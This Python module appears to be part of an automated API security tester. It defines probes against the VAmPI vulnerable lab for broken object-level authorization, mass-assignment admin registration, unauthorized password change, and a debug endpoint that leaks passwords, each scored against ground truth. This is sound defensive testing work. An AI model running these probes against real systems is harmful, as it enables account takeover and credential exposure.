"""Target profiles: the app-specific knowledge the generic loop doesn't have —
how to obtain identities, and how to pose each authorization probe. The loop
stays uniform (plan -> execute -> glue -> judge -> dedup -> evidence); a target
just yields Probe objects that carry an oracle.

VampiTarget implements the VAmPI lab. Each probe maps to a finding id in
lab/ground-truth/vampi.yaml so a run can be scored. The deterministic `signal`
on each ProbeResult is the "looks interesting" prior; the glue and judge tiers
in the loop sit on top of it, they don't replace it.
"""
from __future__ import annotations

import os
import re
from dataclasses import dataclass, field
from typing import Callable

from .executor import Exchange, Executor
from .surface import Operation


@dataclass
class Identity:
    name: str
    role: str
    token: str | None = None

    @property
    def headers(self) -> dict[str, str]:
        return {"Authorization": f"Bearer {self.token}"} if self.token else {}


@dataclass
class ProbeResult:
    attacker: Exchange                 # the request/response that is the evidence
    observation: str                   # human + glue readable summary of the diff
    signal: bool                       # deterministic "looks interesting" prior
    control: Exchange | None = None    # secure-twin / owner contrast
    details: dict = field(default_factory=dict)
    # Same oracle applied to the secure twin. None when there was no usable
    # control response; True means the secure twin also showed the signal.
    control_signal: bool | None = None


@dataclass
class Probe:
    id: str
    finding_id: str                    # ground-truth id this maps to
    category: str
    operation: str
    description: str
    attacker: str                      # identity name
    owner: str | None
    run: Callable[[Executor], ProbeResult]


def _rand(n: int = 6) -> str:
    return os.urandom(n).hex()


# A title from a target listing becomes one path segment. Anything else (a "/",
# "..", "?", "%") could steer the request to a different route, so skip it.
_TITLE = re.compile(r"[A-Za-z0-9_-]+")


def _others_book(listing: Exchange, attacker: str, prefer_owner: str | None = None) -> tuple[str, str] | None:
    """First (title, owner) in a GET /books/v1 listing that the attacker does not own."""
    body = listing.response_body if isinstance(listing.response_body, dict) else {}
    books = body.get("Books")
    candidates = [
        (book["book_title"], book["user"])
        for book in (books if isinstance(books, list) else [])
        if isinstance(book, dict)
        and isinstance(book.get("book_title"), str) and _TITLE.fullmatch(book["book_title"])
        and isinstance(book.get("user"), str) and book["user"] and book["user"] != attacker
    ]
    if prefer_owner is not None:
        preferred = [candidate for candidate in candidates if candidate[1] == prefer_owner]
        candidates = preferred or candidates
    return candidates[0] if candidates else None


def _read_others_book(exchange: Exchange, attacker: str) -> bool:
    """The BOLA oracle: a 200 that returns another user's secret."""
    body = exchange.response_body if isinstance(exchange.response_body, dict) else {}
    return exchange.status_code == 200 and "secret" in body and body.get("owner") != attacker


class VampiTarget:
    name = "vampi"

    def __init__(self, base_url: str, control_url: str | None = None):
        self.base = base_url.rstrip("/")
        self.control = (control_url or "").rstrip("/") or None

    # --- identities ---
    def _login(self, ex: Executor, url: str, user: str, pw: str) -> str | None:
        r = ex.send("POST", f"{url}/users/v1/login", json_body={"username": user, "password": pw})
        if isinstance(r.response_body, dict):
            return r.response_body.get("auth_token")
        return None

    def _register(self, ex: Executor, url: str, user: str, pw: str, email: str, admin: bool | None = None) -> Exchange:
        body = {"username": user, "password": pw, "email": email}
        if admin is not None:
            body["admin"] = admin
        return ex.send("POST", f"{url}/users/v1/register", json_body=body)

    def identities(self, ex: Executor) -> dict[str, Identity]:
        """VAmPI seeds name1/name2/admin via /createdb. Log them in on the
        vulnerable twin to get the A-vs-B pair + an admin."""
        seeds = [("name1", "pass1", "user"), ("name2", "pass2", "user"), ("admin", "pass1", "admin")]
        out: dict[str, Identity] = {}
        for user, pw, role in seeds:
            out[user] = Identity(name=user, role=role, token=self._login(ex, self.base, user, pw))
        return out

    # --- probes ---
    def build_probes(self, ex: Executor, ids: dict[str, Identity], ops: list[Operation]) -> list[Probe]:
        probes: list[Probe] = []
        attacker = ids["name1"]

        # P1 — BOLA on an object-bearing GET: name1 reads a book owned by another.
        # Discover ownership from the list endpoint (spec-driven: this op carries a
        # path param, so it is an object reference).
        book_op = next((o for o in ops if o.method == "get" and "{book_title}" in o.path), None)
        listing = ex.send("GET", f"{self.base}/books/v1", headers=attacker.headers)
        others_book = _others_book(listing, attacker.name)
        if book_op and others_book:
            title, owner = others_book

            def run_bola(e: Executor, title=title, owner=owner) -> ProbeResult:
                atk = e.send("GET", f"{self.base}/books/v1/{title}", headers=attacker.headers)
                signal = _read_others_book(atk, attacker.name)
                body = atk.response_body if isinstance(atk.response_body, dict) else {}
                obs = (f"name1 requested book '{title}' owned by {owner}. "
                       f"status={atk.status_code}, secret_returned={'secret' in body}, "
                       f"owner_in_response={body.get('owner')}.")
                details = {"object": title, "owner": owner}
                ctrl = None
                ctrl_signal = None
                if self.control:
                    # Each twin seeds its own random titles, so the vulnerable
                    # twin's title would simply 404 here. Repeat the same test on
                    # the secure twin with a book that twin says another user owns.
                    ctok = self._login(e, self.control, "name1", "pass1")
                    target = None
                    if ctok:
                        cheaders = {"Authorization": f"Bearer {ctok}"}
                        clisting = e.send("GET", f"{self.control}/books/v1", headers=cheaders)
                        target = _others_book(clisting, attacker.name, prefer_owner=owner)
                    if target is None:
                        details["control"] = "unavailable"
                        obs += " secure-twin control unavailable."
                    else:
                        ctitle, cowner = target
                        ctrl = e.send("GET", f"{self.control}/books/v1/{ctitle}", headers=cheaders)
                        details.update(control_object=ctitle, control_owner=cowner)
                        obs += f" secure-twin status={ctrl.status_code}."
                        if ctrl.status_code is not None:
                            ctrl_signal = _read_others_book(ctrl, attacker.name)
                return ProbeResult(attacker=atk, observation=obs, signal=signal, control=ctrl,
                                   details=details, control_signal=ctrl_signal)

            probes.append(Probe(
                id="p-bola-books", finding_id="vampi-bola-books",
                category="API1:2023 Broken Object Level Authorization",
                operation=str(book_op), description=f"name1 reads {owner}'s book '{title}'",
                attacker="name1", owner=owner, run=run_bola))

        # P2 — mass assignment -> privilege escalation: register with admin:true.
        def run_massassign(e: Executor) -> ProbeResult:
            u = f"ma_{_rand()}"
            self._register(e, self.base, u, "pw12345", f"{u}@mail.com", admin=True)
            tok = self._login(e, self.base, u, "pw12345")
            me = e.send("GET", f"{self.base}/me", headers={"Authorization": f"Bearer {tok}"})
            data = me.response_body.get("data", {}) if isinstance(me.response_body, dict) else {}
            signal = bool(data.get("admin"))
            ctrl = None
            if self.control:
                cu = f"ma_{_rand()}"
                self._register(e, self.control, cu, "pw12345", f"{cu}@mail.com", admin=True)
                ctok = self._login(e, self.control, cu, "pw12345")
                ctrl = e.send("GET", f"{self.control}/me", headers={"Authorization": f"Bearer {ctok}"})
            obs = f"registered {u} with admin=true; /me reports admin={data.get('admin')}."
            ctrl_signal = None
            if isinstance(getattr(ctrl, "response_body", None), dict):
                cdata = ctrl.response_body.get("data", {})
                cdata = cdata if isinstance(cdata, dict) else {}
                obs += f" secure-twin admin={cdata.get('admin')}."
                ctrl_signal = bool(cdata.get("admin"))
            return ProbeResult(attacker=me, observation=obs, signal=signal, control=ctrl,
                               details={"user": u}, control_signal=ctrl_signal)

        reg_op = next((o for o in ops if o.method == "post" and o.path.endswith("/register")), None)
        probes.append(Probe(
            id="p-massassign-admin", finding_id="vampi-massassign-admin",
            category="API3:2023 Broken Object Property Level Authorization (mass assignment)",
            operation=str(reg_op) if reg_op else "POST /users/v1/register",
            description="self-register as admin via a client-supplied field",
            attacker="(anonymous)", owner=None, run=run_massassign))

        # P3 — BFLA: change another user's password (throwaway victim/attacker).
        def run_bfla_pw(e: Executor) -> ProbeResult:
            victim = f"v_{_rand()}"; atk = f"a_{_rand()}"; newpw = "changed_" + _rand(4)
            self._register(e, self.base, victim, "vpw12345", f"{victim}@mail.com")
            self._register(e, self.base, atk, "apw12345", f"{atk}@mail.com")
            atok = self._login(e, self.base, atk, "apw12345")
            change = e.send("PUT", f"{self.base}/users/v1/{victim}/password",
                            headers={"Authorization": f"Bearer {atok}"}, json_body={"password": newpw})
            # did the victim's password actually change? try logging in as victim with the new pw
            victim_new = self._login(e, self.base, victim, newpw)
            signal = bool(victim_new)
            ctrl = None
            ctrl_signal = None
            if self.control:
                cv = f"v_{_rand()}"; ca = f"a_{_rand()}"; cnew = "changed_" + _rand(4)
                self._register(e, self.control, cv, "vpw12345", f"{cv}@mail.com")
                self._register(e, self.control, ca, "apw12345", f"{ca}@mail.com")
                catok = self._login(e, self.control, ca, "apw12345")
                e.send("PUT", f"{self.control}/users/v1/{cv}/password",
                       headers={"Authorization": f"Bearer {catok}"}, json_body={"password": cnew})
                ctrl_login = self._login(e, self.control, cv, cnew)
                ctrl_signal = bool(ctrl_login)
                ctrl = Exchange(method="LOGIN", url=f"{self.control}/users/v1/login",
                                status_code=200 if ctrl_login else 401,
                                response_body={"victim_password_changed": bool(ctrl_login)})
            obs = (f"attacker {atk} set a new password on victim {victim}; "
                   f"victim login with the new password {'SUCCEEDED' if victim_new else 'failed'}.")
            return ProbeResult(attacker=change, observation=obs, signal=signal, control=ctrl,
                               details={"victim": victim, "attacker": atk},
                               control_signal=ctrl_signal)

        pw_op = next((o for o in ops if o.method == "put" and o.path.endswith("/password")), None)
        probes.append(Probe(
            id="p-bfla-password", finding_id="vampi-bfla-password",
            category="API5:2023 Broken Function Level Authorization (unauthorized password change)",
            operation=str(pw_op) if pw_op else "PUT /users/v1/{username}/password",
            description="attacker changes another user's password",
            attacker="(throwaway)", owner="(throwaway victim)", run=run_bfla_pw))

        # P4 — excessive data exposure (ungated, unauthenticated): /_debug leaks passwords.
        def run_debug(e: Executor) -> ProbeResult:
            r = e.send("GET", f"{self.base}/users/v1/_debug")
            users = r.response_body.get("users", []) if isinstance(r.response_body, dict) else []
            signal = bool(users) and "password" in (users[0] if users else {})
            obs = (f"unauthenticated GET /_debug returned {len(users)} users; "
                   f"password field present={signal}.")
            return ProbeResult(attacker=r, observation=obs, signal=signal, control=None,
                               details={"users": len(users)})

        debug_op = next((o for o in ops if o.method == "get" and o.path.endswith("_debug")), None)
        probes.append(Probe(
            id="p-excessive-debug", finding_id="vampi-excessive-debug",
            category="API3:2023 Broken Object Property Level Authorization (excessive data exposure)",
            operation=str(debug_op) if debug_op else "GET /users/v1/_debug",
            description="unauthenticated debug endpoint leaks all users' passwords",
            attacker="(anonymous)", owner=None, run=run_debug))

        return probes
